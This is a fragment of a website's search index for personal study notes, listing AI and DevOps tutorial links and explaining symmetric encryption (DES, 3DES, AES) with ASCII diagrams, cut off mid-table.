Tutorial Playlist</p> </li> </ul>"},{"location":"ai/langgraph/","title":"LangGraph","text":""},{"location":"ai/langgraph/#youtube","title":"Youtube","text":""},{"location":"ai/langgraph/#freecodecamp","title":"Freecodecamp","text":"<ul> <li>LangGraph Complete Course for Beginners - Complex AI Agents with Python</li> </ul>"},{"location":"ai/remove-this-file-%20and%20copy-the-contents/","title":"AGentic AI","text":""},{"location":"ai/remove-this-file-%20and%20copy-the-contents/#youtube","title":"Youtube","text":""},{"location":"ai/remove-this-file-%20and%20copy-the-contents/#introduction","title":"Introduction","text":"<ul> <li>What is Langchain and vector databases</li> <li>LangChain vs LangGraph vs LangSmith</li> <li>LangChain vs LangGraph: A Tale of Two Frameworks</li> <li>Most Popular Framework-Langchain vs LangGraph</li> <li>LangChain Explained in 10 Minutes (Components Breakdown + Build Your First AI Chatbot)</li> <li>What are Vector Embeddings? | Pinecone DB | ChatGPT</li> </ul>"},{"location":"ai/remove-this-file-%20and%20copy-the-contents/#course","title":"Course","text":"<ul> <li>Agentic AI Tutorial for Beginners | Langgraph Tutorial</li> </ul>"},{"location":"devops/","title":"DevOps","text":""},{"location":"devops/#youtube","title":"Youtube","text":""},{"location":"devops/#channels-and-playlists","title":"Channels and playlists","text":"<ul> <li>Abhishek.Veeramalla</li> <li>DEVOPS ZERO TO HERO COURSE</li> <li>AWS Zero to Hero - AWS Simplified</li> <li>Terraform Zero to Hero</li> <li>Learn Observability in 5 hours | Tool wise Demo + Complete Demo using Open Telemetry</li> <li>Projects<ul> <li>Create EKS Cluster with VPC using Terraform | Real Time Terraform Modules Implementation</li> <li>Create EKS Cluster with VPC using Terraform | Real Time Terraform Modules Implementation</li> <li>Kubernetes End to End project on EKS | EKS Install and app deploy with Ingress</li> <li>AWS EKS</li> <li>Deploy an E Commerce Three Tier application on AWS EKS | 8 Services and 2 Databases</li> <li>Three Tier Architecture Deployment on AWS EKS</li> <li>Ultimate DevOps Project Implementation</li> <li>AWS EKS Kubernetes Tutorial [Full Course]</li> </ul> </li> </ul>"},{"location":"devops/#blogs-and-websites","title":"Blogs and Websites","text":"<ul> <li>Master DevOps If You Master it : System Design !!</li> <li>Top 110+ DevOps Interview Questions and Answers for 2025</li> <li>NotHarshhaa/DevOps-Interview-Questions</li> <li>Learn DevSecOps and API Security</li> </ul>"},{"location":"security/authentication-and-authorization/","title":"Authentication and Authorization","text":""},{"location":"security/authentication-and-authorization/#blogs","title":"Blogs","text":"<ul> <li>Authn vs. authz: How are they different?</li> <li>AuthZ vs AuthN - What is the Difference Exactly?</li> </ul>"},{"location":"security/devsecops/","title":"DevSecOps","text":""},{"location":"security/devsecops/#youtube","title":"Youtube","text":"<ul> <li>What is DevSecOps? DevSecOps explained in 8 Mins</li> <li>DevSecOps Tutorial for Beginners | CI Pipeline with GitHub Actions and Docker Scout</li> <li>The Importance of DevSecOps and 5 Steps for Doing it Properly (DevSecOps EXPLAINED)</li> </ul>"},{"location":"security/encryption/","title":"Symmetric &amp; Asymmetric Encryption","text":""},{"location":"security/encryption/#youtube","title":"Youtube","text":"<ul> <li>25. Symmetric &amp; Asymmetric Encryption with Explanation of AES, Diffie-Hellman and Digital Signature</li> </ul>"},{"location":"security/encryption/#theory","title":"Theory","text":""},{"location":"security/encryption/#what-is-encryption-and-decryption","title":"What is Encryption and Decryption?","text":"<p>Encryption is the process of converting plaintext (readable data) into ciphertext (scrambled, unreadable data) using an algorithm and a key. Decryption is the reverse process of converting ciphertext back to plaintext.</p> <p>Purpose: - Confidentiality: Protect sensitive data from unauthorized access - Data Security: Secure data in transit and at rest - Privacy: Keep personal information private - Compliance: Meet regulatory requirements (GDPR, HIPAA, PCI-DSS)</p>"},{"location":"security/encryption/#how-encryption-works","title":"How Encryption Works","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              Encryption &amp; Decryption Process                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nENCRYPTION:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Plaintext   \u2502     \u2502  Encryption  \u2502     \u2502  Ciphertext  \u2502\n\u2502              \u2502\u2500\u2500\u2500\u2500\u25b6\u2502  Algorithm   \u2502\u2500\u2500\u2500\u2500\u25b6\u2502              \u2502\n\u2502 \"Hello 123\"  \u2502     \u2502   + Key      \u2502     \u2502 \"xK9#mP2$...\"\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                            \u2502\n                            \u2502\n                     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                     \u2502 Encryption  \u2502\n                     \u2502     Key     \u2502\n                     \u2502  (Secret)   \u2502\n                     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nDECRYPTION:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Ciphertext  \u2502     \u2502  Decryption  \u2502     \u2502  Plaintext   \u2502\n\u2502              \u2502\u2500\u2500\u2500\u2500\u25b6\u2502  Algorithm   \u2502\u2500\u2500\u2500\u2500\u25b6\u2502              \u2502\n\u2502 \"xK9#mP2$...\"\u2502     \u2502   + Key      \u2502     \u2502 \"Hello 123\"  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                            \u2502\n                            \u2502\n                     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                     \u2502 Decryption  \u2502\n                     \u2502     Key     \u2502\n                     \u2502  (Secret)   \u2502\n                     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nKEY COMPONENTS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n1. Plaintext:  Original readable data\n2. Algorithm:  Mathematical function (AES, RSA, etc.)\n3. Key:        Secret value used by algorithm\n4. Ciphertext: Encrypted, unreadable output\n</code></pre> <p>Example Process: <pre><code>Plaintext:    \"HELLO WORLD\"\nAlgorithm:    AES-256\nKey:          \"my-secret-key-12345\"\n             \u2193\nEncryption:   Apply AES-256 algorithm with key\n             \u2193\nCiphertext:   \"j8kL#2mN9qR$5tX...\"\n             \u2193\nDecryption:   Apply AES-256 algorithm with same key\n             \u2193\nPlaintext:    \"HELLO WORLD\"\n</code></pre></p>"},{"location":"security/encryption/#symmetric-encryption","title":"Symmetric Encryption","text":"<p>Definition: Encryption method that uses the same key for both encryption and decryption.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                 Symmetric Encryption                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n         \u2502      Shared Secret Key           \u2502\n         \u2502       \"mySecretKey123\"           \u2502\n         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                      \u2502          \u2502\n         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2510      \u2502\n         \u2502  ENCRYPTION    \u2502      \u2502\n         \u2502                \u2502      \u2502\nSender   \u2502  Plaintext \u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u25b6 Ciphertext\n         \u2502  \"Hello\"       \u2502      \u2502        \"xK9#mP2$\"\n         \u2502                \u2502      \u2502\n         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2502\n                                 \u2502\n                                 \u2502\n                      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                      \u2502    TRANSMISSION     \u2502\n                      \u2502   (Over Network)    \u2502\n                      \u2502   Ciphertext Sent   \u2502\n                      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                                 \u2502\n                                 \u2502\n         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u2502\n         \u2502  DECRYPTION    \u2502      \u2502\n         \u2502                \u2502      \u2502\nReceiver \u2502  Ciphertext \u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n         \u2502  \"xK9#mP2$\"    \u2502\n         \u2502       \u2502        \u2502\n         \u2502       \u25bc        \u2502\n         \u2502  Plaintext     \u2502\n         \u2502  \"Hello\"       \u2502\n         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nKEY CHARACTERISTIC:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nSame key used for encryption AND decryption\nBoth parties must have the secret key\n</code></pre>"},{"location":"security/encryption/#symmetric-encryption-algorithms","title":"Symmetric Encryption Algorithms","text":"<p>Evolution and Improvements:</p> Algorithm Key Size Year Status Notes DES 56-bit 1977 \u274c Deprecated Too weak, broken by brute force 3DES 168-bit 1998 \u26a0\ufe0f Legacy Triple encryption, slow, being phased out AES 128/192/256-bit 2001 \u2705 Current Standard Fast, secure, widely used ChaCha20 256-bit 2008 \u2705 Modern Fast on mobile, used in TLS Blowfish 32-448 bit 1993 \u26a0\ufe0f Legacy Replaced by AES Twofish 128/192/256-bit 1998 \u2705 Secure AES finalist, still secure <p>Modern Algorithm: AES (Advanced Encryption Standard)</p> <p>Advantages of AES over DES: - \u2705 Stronger Security: 256-bit keys vs 56-bit (2^200 times harder to crack) - \u2705 Faster: Hardware acceleration in modern CPUs - \u2705 Flexible: Multiple key sizes (128, 192, 256 bits) - \u2705 Proven: Extensively analyzed, no practical attacks - \u2705 Government Approved: Used by NSA for classified data - \u2705 Efficient: Low memory footprint</p> <p>AES Modes of Operation: <pre><code>ECB (Electronic Codebook):        \u274c Not recommended (patterns visible)\nCBC (Cipher Block Chaining):      \u2705 Good for files\nCTR (Counter Mode):                \u2705 Good for random access\nGCM (Galois/Counter Mode):         \u2705 Best - Encryption + Authentication\n</code></pre></p>"},{"location":"security/encryption/#detailed-symmetric-encryption-algorithms","title":"Detailed Symmetric Encryption Algorithms","text":""},{"location":"security/encryption/#des-data-encryption-standard","title":"DES (Data Encryption Standard)","text":"<p>Description: DES was the first widely adopted modern encryption standard, developed by IBM and adopted by NIST in 1977. It's a block cipher that encrypts data in 64-bit blocks using a 56-bit key.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              DES Algorithm Structure                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nINPUT: 64-bit Plaintext Block\n       \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Initial Permutation  \u2502  Rearrange bits\n\u2502        (IP)          \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n           \u2502\n      Split into\n           \u2502\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n    \u2502             \u2502\nLeft 32 bits  Right 32 bits\n    \u2502             \u2502\n    \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n    \u2502  16 Rounds  \u2502\n    \u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u2502\n    \u2502  \u2502Round 1\u2502  \u2502  Each round:\n    \u2502  \u2502  K1   \u2502  \u2502  - Expansion\n    \u2502  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524  \u2502  - XOR with key\n    \u2502  \u2502Round 2\u2502  \u2502  - S-boxes (substitution)\n    \u2502  \u2502  K2   \u2502  \u2502  - Permutation\n    \u2502  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524  \u2502\n    \u2502  \u2502  ...  \u2502  \u2502\n    \u2502  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524  \u2502\n    \u2502  \u2502Round16\u2502  \u2502\n    \u2502  \u2502  K16  \u2502  \u2502\n    \u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2502\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n           \u2502\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Final Permutation    \u2502  Inverse of IP\n\u2502      (IP\u207b\u00b9)          \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n           \u2502\nOUTPUT: 64-bit Ciphertext\n\nKEY SCHEDULE:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n56-bit Key \u2192 Generate 16 subkeys (K1-K16)\nEach round uses different subkey\n</code></pre> <p>Specifications: - Block Size: 64 bits - Key Size: 56 bits (+ 8 parity bits = 64 bits total) - Rounds: 16 - Structure: Feistel Network</p> <p>Advantages (Historical): - \u2705 Well-studied and understood - \u2705 Hardware implementations very fast - \u2705 Simple to implement</p> <p>Disadvantages: - \u274c Too Weak: 56-bit key is too small (2^56 = 72 quadrillion keys) - \u274c Broken: Can be cracked in days with modern hardware - \u274c Small Block Size: 64-bit blocks lead to collisions - \u274c Deprecated: Should not be used anymore</p> <p>Why DES Failed: <pre><code>Key Space: 2^56 = 72,057,594,037,927,936 possible keys\n\n1977:  Would take years to brute force\n1998:  EFF's DES Cracker broke DES in 56 hours\n2006:  COPACOBANA broke DES in 9 days (cost: $10,000)\n2025:  Can be broken in seconds with cloud computing\n\nExample Attack Cost:\nAWS EC2: ~$100 to crack DES in a few hours\n</code></pre></p>"},{"location":"security/encryption/#3des-triple-des","title":"3DES (Triple DES)","text":"<p>Description: 3DES applies DES three times with different keys to increase security. It was created as a temporary solution when DES became too weak.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              3DES Algorithm (EDE Mode)                       \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nPlaintext\n    \u2502\n    \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Encrypt     \u2502  Key1 (56 bits)\n\u2502  (DES)      \u2502  Encryption with first key\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502\n       \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Decrypt     \u2502  Key2 (56 bits)\n\u2502  (DES)      \u2502  Decryption with second key\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502\n       \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Encrypt     \u2502  Key3 (56 bits)\n\u2502  (DES)      \u2502  Encryption with third key\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502\n       \u25bc\nCiphertext\n\nTotal Key Length: 168 bits (3 \u00d7 56)\nEffective Security: ~112 bits (due to meet-in-the-middle attacks)\n\nVariants:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n1. 3DES-EDE3: K1, K2, K3 all different (168-bit)\n2. 3DES-EDE2: K1=K3, K2 different (112-bit)\n3. 3DES-EEE:  All encryption (less common)\n</code></pre> <p>Advantages: - \u2705 Backward compatible with DES - \u2705 Stronger than DES (112-168 bit effective security) - \u2705 No known practical attacks</p> <p>Disadvantages: - \u274c Slow: 3x slower than DES, 6-7x slower than AES - \u274c Small Block Size: Still 64-bit blocks - \u274c Being Deprecated: NIST deprecated in 2023 - \u274c Inefficient: Legacy design</p>"},{"location":"security/encryption/#aes-advanced-encryption-standard","title":"AES (Advanced Encryption Standard)","text":"<p>Description: AES, also known as Rijndael, is the current encryption standard. It was selected through a public competition and adopted by NIST in 2001. It's a substitution-permutation network (SPN) cipher.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              AES Algorithm Structure                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nINPUT: 128-bit Plaintext (16 bytes)\n       \u2193\nArranged in 4\u00d74 matrix (State):\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 b0  b4  b8  b12 \u2502\n\u2502 b1  b5  b9  b13 \u2502\n\u2502 b2  b6  b10 b14 \u2502\n\u2502 b3  b7  b11 b15 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Initial Round (Add Round Key)   \u2502\n\u2502 XOR with first round key        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                \u2502\n        \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n        \u2502   Main Rounds \u2502  (Nr-1 rounds)\n        \u2502               \u2502  Nr = 10, 12, or 14\n        \u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u2502  depending on key size\n        \u2502  \u2502 Round 1 \u2502  \u2502\n        \u2502  \u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n        \u2502  \u2502  \u2502 1. SubBytes       \u2502 S-box substitution\n        \u2502  \u2502  \u2502 2. ShiftRows      \u2502 Rotate rows\n        \u2502  \u2502  \u2502 3. MixColumns     \u2502 Mix column data\n        \u2502  \u2502  \u2502 4. AddRoundKey    \u2502 XOR with round key\n        \u2502  \u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n        \u2502  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n        \u2502  \u2502 Round 2 \u2502\n        \u2502  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n        \u2502  \u2502   ...   \u2502\n        \u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n        \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                \u2502\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Final Round (No MixColumns)     \u2502\n\u2502 1. SubBytes                     \u2502\n\u2502 2. ShiftRows                    \u2502\n\u2502 3. AddRoundKey                  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                \u2502\nOUTPUT: 128-bit Ciphertext\n\nAES OPERATIONS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n1. SubBytes (S-box):\n   \u250c\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2510\n   \u2502 A \u2502 \u2192 \u2502 C \u2502  Each byte substituted\n   \u2502 B \u2502 \u2192 \u2502 7 \u2502  using lookup table\n   \u2514\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2518\n\n2. ShiftRows:\n   Row 0: No shift\n   Row 1: Left shift by 1\n   Row 2: Left shift by 2\n   Row 3: Left shift by 3\n\n3. MixColumns:\n   Multiply each column by fixed matrix\n   (Provides diffusion)\n\n4. AddRoundKey:\n   XOR state with round key\n</code></pre> <p>AES Variants: <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502        AES-128  \u2502  AES-192  \u2502  AES-256         \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Key Size:   128 \u2502  192      \u2502  256 bits        \u2502\n\u2502 Rounds:     10  \u2502  12       \u2502  14              \u2502\n\u2502 Security:   High\u2502  Higher   \u2502  Highest         \u2502\n\u2502 Speed:      Fast\u2502  Medium   \u2502  Slower          \u2502\n\u2502 Use Case: Standard\u2502Government\u2502Top 